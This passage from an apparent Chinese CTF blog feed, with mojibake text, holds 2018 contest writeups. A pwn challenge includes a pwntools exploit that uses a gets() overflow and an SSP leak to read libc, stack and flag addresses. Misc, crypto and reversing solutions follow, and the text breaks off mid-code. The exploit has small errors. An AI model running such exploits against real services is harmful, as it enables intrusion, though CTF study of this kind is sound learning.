class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __WAIT_STATUS stat_loc; <span class="comment">// [rsp+14h] [rbp-8Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+1Ch] [rbp-84h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+20h] [rbp-80h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+28h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+30h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">char</span> s2; <span class="comment">// [rsp+60h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v10; <span class="comment">// [rsp+98h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v7 = <span class="number">3L</span>L;</span><br><span class="line">  LODWORD(stat_loc.__uptr) = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0L</span>L;</span><br><span class="line">  sub_4009A6();</span><br><span class="line">  HIDWORD(stat_loc.__iptr) = open(<span class="string">"./flag.txt"</span>, <span class="number">0</span>, a2);</span><br><span class="line">  <span class="keyword">if</span> ( HIDWORD(stat_loc.__iptr) == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">"./flag.txt"</span>);</span><br><span class="line">    _exit(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  read(SHIDWORD(stat_loc.__iptr), &amp;buf, <span class="number">0x30</span>uLL);</span><br><span class="line">  close(SHIDWORD(stat_loc.__iptr));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"This is GUESS FLAG CHALLENGE!"</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v6 &gt;= v7 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"you have no sense... bye :-) "</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    v5 = sub_400A11();                          <span class="comment">// fork()</span></span><br><span class="line">    <span class="keyword">if</span> ( !v5 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++v6;</span><br><span class="line">    wait((__WAIT_STATUS)&amp;stat_loc);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Please type your guessing flag"</span>);</span><br><span class="line">  gets((__int64)&amp;s2);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;buf, &amp;s2) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"You must have great six sense!!!! :-o "</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"You should take more effort to get six sence, and one more challenge!!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>checksecåå‘ç°å¼€äº†<code>Canary</code>ã€‚<code>Canary</code>æ£€æŸ¥å¤±è´¥çš„æ—¶å€™è°ƒç”¨<code>__stack_chk_fail</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> </span><br><span class="line">__attribute__ ((noreturn)) </span><br><span class="line">__stack_chk_fail (<span class="keyword">void</span>) &#123;   </span><br><span class="line">    __fortify_fail (<span class="string">"stack smashing detected"</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­çš„<code>__fortify_fail</code>æ‰“å°å‡ºäº†<code>__libc_argv[0]</code>æ‰€æŒ‡å‘å­—ç¬¦ä¸²ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> </span><br><span class="line">__attribute__ ((noreturn)) </span><br><span class="line">__fortify_fail (msg)</span><br><span class="line">   <span class="keyword">const</span> <span class="keyword">char</span> *msg; &#123;</span><br><span class="line">      <span class="comment">/* The loop is added only to keep gcc happy. */</span></span><br><span class="line">         <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">              __libc_message (<span class="number">2</span>, <span class="string">"*** %s ***: %s terminated\n"</span>, msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">"&lt;unknown&gt;"</span>) </span><br><span class="line">&#125; </span><br><span class="line">libc_hidden_def (__fortify_fail)</span><br></pre></td></tr></table></figure><p>å¯ä»¥é€šè¿‡è¦†ç›–<code>__libc_argv[0]</code>å®ç°è¯»å–æƒ³è¦çš„æ•°æ®ï¼Œä¹Ÿå°±æ˜¯<a href="https://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/" target="_blank" rel="noopener">SSPï¼ˆStack Smashing Protectorï¼‰ Leak</a>ã€‚è°ƒè¯•è¿‡ç¨‹ä¸­æœ‰ä¸€ä¸ªæ¯”è¾ƒå®¹æ˜“è·å–æŒ‡é’ˆçš„æ–¹æ³•ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">assassinq&gt;&gt; p &amp;__libc_argv[0]</span><br><span class="line">$1 = (char **) 0x7fffffffe4c8</span><br></pre></td></tr></table></figure><p>ç„¶åå› ä¸ºlibcå¯¼å‡ºäº†ä¸€ä¸ªç¬¦å·<a href="http://tacxingxing.com/2017/12/16/environ/" target="_blank" rel="noopener">environ</a>ï¼Œå…¶å€¼å’Œ<code>main</code>å‡½æ•°çš„ç¬¬ä¸‰ä¸ªå‚æ•°<code>envp</code>ä¸€æ ·ã€‚è¿™æ ·çš„è¯ï¼Œåªè¦æ³„æ¼å‡ºlibcçš„åŸºå€å°±å¯ä»¥å¾—åˆ°æ ˆä¸Šçš„åœ°å€ã€‚</p><p>ä¸‰æ¬¡è¿›ç¨‹æ­£å¥½åˆ†ä¸ºï¼š</p><ol><li>åˆ©ç”¨gotè¡¨å¾—åˆ°libcåœ°å€</li><li>åˆ©ç”¨libcçš„environå¾—åˆ°stackåœ°å€</li><li>è®¡ç®—flagåœ°å€å¹¶è¾“å‡º</li></ol><p>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">'./guess'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'106.75.90.160'</span>, <span class="number">9999</span>)</span><br><span class="line">elf = ELF(<span class="string">'./guess'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">buf = <span class="number">0x7fffffffe4d0</span></span><br><span class="line">argv_0 = <span class="number">0x7fffffffe5f8</span></span><br><span class="line">offset1 = argv_0 - gets</span><br><span class="line">offset2 = <span class="number">0x7ffd12119a88</span> - <span class="number">0x7ffd12119920</span></span><br><span class="line">gets_got = elf.got[<span class="string">'gets'</span>] <span class="comment"># 0x602058</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># got ==&gt; libc</span></span><br><span class="line">p.recvuntil(<span class="string">'flag\n'</span>)</span><br><span class="line">payload = <span class="string">'A'</span> * offset1 + p64(gets_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">'***: '</span>)</span><br><span class="line">gets_got = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(gets_got)</span><br><span class="line">libc_base = gets_got - libc.symbols[<span class="string">'gets'</span>]</span><br><span class="line">libc.address = libc_base</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc ==&gt; environ ==&gt; stack</span></span><br><span class="line">p.recvuntil(<span class="string">'flag\n'</span>)</span><br><span class="line">payload = <span class="string">'A'</span> * offset1 + p64(libc.symbols[<span class="string">'environ'</span>])</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">'***: '</span>)</span><br><span class="line">stack = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(stack)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line">p.recvuntil(<span class="string">'flag\n'</span>)</span><br><span class="line">payload = <span class="string">'B'</span> * offset1 + p64(stack - offset2)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="minified"><a href="#minified" class="headerlink" title="minified"></a>minified</h2><p>å–å‡ºAlpha0å’ŒGreen0é€šé“çš„å›¾ç‰‡åå¼‚æˆ–å¾—åˆ°flagã€‚</p><p><img src="/pics/2018-ç½‘é¼æ¯-review/minified/1.PNG" alt="Alpha0"></p><p><img src="/pics/2018-ç½‘é¼æ¯-review/minified/2.PNG" alt="Green0"></p><p><img src="/pics/2018-ç½‘é¼æ¯-review/minified/3.PNG" alt="flag"></p><h2 id="åŒè‰²å—"><a href="#åŒè‰²å—" class="headerlink" title="åŒè‰²å—"></a>åŒè‰²å—</h2><p>å…ˆä¸Šbinwalkå¾—åˆ°å›¾ç‰‡ï¼Œkeyä¸ºctfer2333ã€‚</p><p>å°è¯•æŠŠgifæ¯ä¸€ä¸ªå¸§æ‹¼å‡‘æˆå›¾ç‰‡ï¼Œå‘ç°æ— æ³•å¾—åˆ°ä¸€ä¸ªæ­£å¸¸çš„äºŒç»´ç ã€‚</p><p>å†çŒœæµ‹å°†ç´«è‰²ä¸ç»¿è‰²è‰²å—åˆ†åˆ«è¡¨ç¤º1å’Œ0ï¼Œå…ˆæå–å‡ºæ¯å¼ å›¾ç‰‡ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(gif_file)</span>:</span></span><br><span class="line">    png_dir = <span class="string">'frame/'</span></span><br><span class="line">    img = Image.open(gif_file)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            current = img.tell()</span><br><span class="line">            <span class="keyword">print</span> current</span><br><span class="line">            img.save(png_dir + str(current + <span class="number">1</span>) + <span class="string">'.png'</span>)</span><br><span class="line">            img.seek(current + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span> BaseException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">print</span> e</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    gif_file = <span class="string">'out.gif'</span></span><br><span class="line">    main(gif_file)</span><br></pre></td></tr></table></figure><p>å†è¯»å–å›¾ç‰‡å†…å®¹ï¼Œè½¬æ¢æˆ0å’Œ1ï¼Œæœ€åæ¯8ä½è½¬ä¸ºä¸€ä¸ªasciiå­—ç¬¦ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    png_dir = <span class="string">'frame/'</span></span><br><span class="line">    ret = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">24</span>):</span><br><span class="line">        line = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">24</span>):</span><br><span class="line">            file_name = <span class="string">'frame/'</span> + str(i * <span class="number">24</span> + j + <span class="number">1</span>) + <span class="string">'.png'</span></span><br><span class="line">            x = j * <span class="number">10</span> + <span class="number">5</span></span><br><span class="line">            y = i * <span class="number">10</span> + <span class="number">5</span></span><br><span class="line">            img = Image.open(file_name)</span><br><span class="line">            img = img.convert(<span class="string">'RGB'</span>) </span><br><span class="line">            img_array = img.load()</span><br><span class="line">            r, g, b = p = img_array[x, y]</span><br><span class="line">            <span class="keyword">if</span> g == <span class="number">255</span>:</span><br><span class="line">                line += <span class="string">'0'</span></span><br><span class="line">            <span class="keyword">if</span> r == <span class="number">255</span> <span class="keyword">and</span> b == <span class="number">255</span>:</span><br><span class="line">                line += <span class="string">'1'</span></span><br><span class="line">            <span class="keyword">if</span> len(line) == <span class="number">8</span>:</span><br><span class="line">                ret += chr(int(line, <span class="number">2</span>))</span><br><span class="line">                line = <span class="string">''</span></span><br><span class="line">    <span class="keyword">print</span> ret</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>å»æ‰å¾—åˆ°çš„å­—ç¬¦ä¸²åé¢çš„hhhhhï¼Œå› ä¸ºæ˜æ˜¾ä¸åƒåŠ å¯†åçš„å†…å®¹ï¼Œå°è¯•base64æ— æœåï¼Œç”¨DESè§£å¯†ï¼Œå¯†é’¥å³ä¸ºä¸€å¼€å§‹å¾—åˆ°çš„ctfer2333ï¼Œå¾—åˆ°flagã€‚</p><h2 id="welcome"><a href="#welcome" class="headerlink" title="welcome"></a>welcome</h2><p>è§£å‹åç”¨catæŠŠæ‰€æœ‰çš„æ–‡ä»¶åˆå¹¶ï¼Œå¾—åˆ°ä¸€ä¸ªzipæ–‡ä»¶ï¼Œçˆ†ç ´å¯†ç å¾—åˆ°flagã€‚</p><p><img src="/pics/2018-ç½‘é¼æ¯-review/welcome/1.png" alt="çˆ†ç ´ç»“æœ"></p><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="shanghai"><a href="#shanghai" class="headerlink" title="shanghai"></a>shanghai</h2><p>ç»´å‰å°¼äºšè§£å¯†ï¼Œ<a href="https://guballa.de/vigenere-solver" target="_blank" rel="noopener">åœ¨çº¿è§£å¯†</a>ï¼Œç›´æ¥å¾—åˆ°flagã€‚</p><p><img src="/pics/2018-ç½‘é¼æ¯-review/shanghai/1.png" alt="flag"></p><p>åŒæ—¶è¿˜å¾—åˆ°å¯†é’¥æ˜¯icqvigenereã€‚</p><h2 id="apl"><a href="#apl" class="headerlink" title="apl"></a>apl</h2><p>ä¹‹å‰PladCTFæœ‰<a href="https://monosource.github.io/writeup/2018/05/08/plaidctf-aplunatics/" target="_blank" rel="noopener">ä¸€é“ç±»ä¼¼çš„é¢˜ç›®</a>ï¼Œåœ¨xmançš„æ—¶å€™ä¹Ÿåˆ†æè¿‡ã€‚</p><p>aplæœ€å¤§çš„ç‰¹ç‚¹æ˜¯ä»å³å¾€å·¦è®¡ç®—ã€‚<code>âµ</code>ä»£è¡¨å³ä¾§çš„å˜é‡ï¼Œ<code>Î±</code>ä»£è¡¨å·¦ä¾§çš„å˜é‡ã€‚</p><p>ä¸€å¼€å§‹ç»™äº†ä¸€é•¿ä¸²base64å­—ç¬¦ä¸²ï¼Œè§£å¯†åå¾—åˆ°aplï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;âµ(~âµ)/(&apos;No_Please_continue&apos;)(&apos;Yes,This_is_flag&apos;)&#125;(âˆŠ(41(41)0+140)(â•UCS(&apos;ÂµÄ›Â»Ã•Ä€$#Ä$Ã¨Ã¡Ã‹ÄÄÄ`Ã¢ÃÄ Â#&quot;!Ä &quot;KE(Â©$#Ä$Q&lt;k&apos;))146)&#123;+/âºâ‰ 33+2âŠ¥(1(5)Ã—8)â´âˆŠ&#123;aâ‰ 8â†‘(1,aâ†(8â´2)âŠ¤âµ)&#125;Â¨2âŠ¥8(+/â´â³(7*2)-âŒŠ9.1âŒŠâ´&apos;FlagIsWhat&apos;)â´10âŠ–âŠ–âŒ½(âˆŠ4(â´â´88888)+16)â´(1+(|Â¯8)â´1)âŠ¤â•UCS(âµ)&#125;&apos;YourFlagIsWhat?&apos;</span><br></pre></td></tr></table></figure><p>å…ˆåˆ†æˆå‡ ä¸ªéƒ¨åˆ†ï¼š</p><ol><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2. ```(âˆŠ(41(41)0+140)(â•UCS(&apos;ÂµÄ›Â»Ã•Ä€$#Ä$Ã¨Ã¡Ã‹ÄÄÄ`Ã¢ÃÄ Â#&quot;!Ä &quot;KE(Â©$#Ä$Q&lt;k&apos;))146)``` ==&gt; ```181 181 140 181 283 187 213 256 36 35 286 36 232 225 203 286 286 285 96 226 222 288 92 120 57 100 35 34 33 288 34 75 69 40 169 36 35 286 36 81 60 107 146</span><br></pre></td></tr></table></figure></li><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">å†é€šè¿‡ä¸»è¦åŠ å¯†è¿‡ç¨‹åˆ†æï¼Œæ ¹æ®aplçš„ç‰¹æ€§åº”è¯¥å€’ç€æ¥ï¼š</span><br><span class="line"></span><br><span class="line">1. `(1+(|Â¯8)â´1)âŠ¤â•UCS(âµ)` ==&gt; å°†asciiè½¬æ¢æˆäºŒè¿›åˆ¶</span><br><span class="line">2. `(âˆŠ4(â´â´88888)+16)` ==&gt; 20 16ï¼Œå³å°†å³ä¾§çš„çŸ©é˜µå¡«å……ä¸º20*16</span><br><span class="line">3. `10âŠ–âŠ–âŒ½` ==&gt; å°†çŸ©é˜µçš„è¡Œå€’åºï¼Œåˆ—å‘ä¸Šä½ç§»10</span><br><span class="line">4. `8(â´â³(7*2)-âŒŠ9.1âŒŠâ´&apos;FlagIsWhat&apos;)` ==&gt; 8 40ï¼Œå³å°†å³ä¾§çš„çŸ©é˜µå¡«å……ä¸º8*40</span><br><span class="line">5. `2âŠ¥` ==&gt; å°†äºŒè¿›åˆ¶è½¬æ¢æˆascii</span><br><span class="line">6. `&#123;aâ‰ 8â†‘(1,aâ†(8â´2)âŠ¤âµ)&#125;` ==&gt; x ^ (x &gt;&gt; 1)</span><br><span class="line">7. `+/âºâ‰ 33+2âŠ¥(1(5)Ã—8)` ==&gt; `Â¨`æŒ‰åˆ—è¯»å–çŸ©é˜µï¼Œç„¶åç»è¿‡ä¸Šä¸€æ­¥çš„ç§»ä½å¼‚æˆ–ï¼Œè½¬ä¸ºasciiç å¹¶åŠ ä¸Š33</span><br><span class="line"></span><br><span class="line">æ¥ä¸‹æ¥æŒ‰æ­¥éª¤é€†å‘å³å¯ï¼š</span><br><span class="line"></span><br><span class="line">```apl</span><br><span class="line">â•UCS(2âŠ¥(8 40)â´âŒ½âŠ–10âŠ–(20 16)â´(8â´2)âŠ¤(106 202 104 193 192 206 201 100 192 194 204 194 75 200 206 106 193 75 192 201 201 194 75 206 196 98 206 75 196 192 201 108 198 204 100 193 46 40 35 38))</span><br></pre></td></tr></table></figure></li></ol><h1 id="å‚è€ƒç½‘ç«™"><a href="#å‚è€ƒç½‘ç«™" class="headerlink" title="å‚è€ƒç½‘ç«™"></a>å‚è€ƒç½‘ç«™</h1><p><a href="https://www.jianshu.com/p/005bda1f8535" target="_blank" rel="noopener">https://www.jianshu.com/p/005bda1f8535</a><br><a href="https://www.anquanke.com/post/id/158386#h3-5" target="_blank" rel="noopener">https://www.anquanke.com/post/id/158386#h3-5</a><br><a href="https://xz.aliyun.com/t/2665" target="_blank" rel="noopener">https://xz.aliyun.com/t/2665</a><br><a href="https://mp.weixin.qq.com/s/d4KB9b83D5iiQAfNieqh3w" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/d4KB9b83D5iiQAfNieqh3w</a><br><a href="https://ihomura.cn/2018/08/23/WriteUp-%E7%BD%91%E9%BC%8E%E6%9D%AF%E6%95%99%E8%82%B2%E7%BB%84/" target="_blank" rel="noopener">https://ihomura.cn/2018/08/23/WriteUp-%E7%BD%91%E9%BC%8E%E6%9D%AF%E6%95%99%E8%82%B2%E7%BB%84/</a><br><a href="https://github.com/TechSecCTF/writeups/tree/master/CSAWQuals2017/realism" target="_blank" rel="noopener">https://github.com/TechSecCTF/writeups/tree/master/CSAWQuals2017/realism</a><br><a href="https://www.jianshu.com/p/005bda1f8535" target="_blank" rel="noopener">https://www.jianshu.com/p/005bda1f8535</a><br><a href="https://blog.csdn.net/whklhhhh/article/details/81950438" target="_blank" rel="noopener">https://blog.csdn.net/whklhhhh/article/details/81950438</a><br><a href="https://xz.aliyun.com/t/2614" target="_blank" rel="noopener">https://xz.aliyun.com/t/2614</a><br><a href="https://blog.csdn.net/whklhhhh/article/details/82217266" target="_blank" rel="noopener">https://blog.csdn.net/whklhhhh/article/details/82217266</a><br><a href="https://xz.aliyun.com/t/2666" target="_blank" rel="noopener">https://xz.aliyun.com/t/2666</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ç°é˜¶æ®µä¸»è¦ä¸€ç›´åœ¨åšé€†å‘ï¼Œçœ‹äº†å¥½å‡ é“é€†å‘çš„wpå¤ç°ä¸€ä¸‹ã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://qianfei11.github.io/tags/ctf/"/>
    
      <category term="review" scheme="https://qianfei11.github.io/tags/review/"/>
    
  </entry>
  
  <entry>
    <title>2018-noxCTF-writeup</title>
    <link href="https://qianfei11.github.io/2018/09/10/2018-noxCTF-writeup/"/>
    <id>https://qianfei11.github.io/2018/09/10/2018-noxCTF-writeup/</id>
    <published>2018-09-10T10:01:51.000Z</published>
    <updated>2018-11-11T05:02:54.378Z</updated>
    
    <content type="html"><![CDATA[<p>è®°å½•å‡ é“ç®€å•é¢˜ã€‚</p><a id="more"></a><h1 id="RE-GuessTheString"><a href="#RE-GuessTheString" class="headerlink" title="RE-GuessTheString"></a>RE-GuessTheString</h1><p>æŠŠæ¯ä¸ªcheckåˆ†è¾¨å‡ºæ¥ï¼Œç„¶åé€ä¸€åˆ†æï¼Œå…ˆåˆ¤æ–­å­—ç¬¦ä¸²é•¿åº¦ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 __<span class="function">fastcall <span class="title">check1</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strlen</span>(a1) == <span class="number">11</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ¤æ–­æ¯ä¸ªå­—ç¬¦æ˜¯å¦éƒ½å¤§äº32ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">check2</span><span class="params">(_BYTE *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// [rsp+0h] [rbp-18h]</span></span><br><span class="line">  _BOOL4 i; <span class="comment">// [rsp+14h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = s;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">1</span>; i &amp;&amp; *v2; i = bigger_than_32(*v2++) )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ç­‰äº66ä¸”ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ç¬¬äºŒä¸ªå­—ç¬¦çš„ä¹˜ç§¯ä¸º3478ï¼Œå¯åˆ†è§£è´¨å› æ•°æ±‚è§£ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">check3</span><span class="params">(<span class="keyword">char</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+14h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *s == <span class="number">66</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( *s * s[<span class="number">1</span>] != <span class="number">3478</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‰ä¸‰ä¸ªæ•°è¿ç»­å¼‚æˆ–å¾—åˆ°49:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">check4</span><span class="params">(<span class="keyword">char</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+14h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( ((<span class="keyword">unsigned</span> __int8)(s[<span class="number">1</span>] ^ *s) ^ (<span class="keyword">unsigned</span> 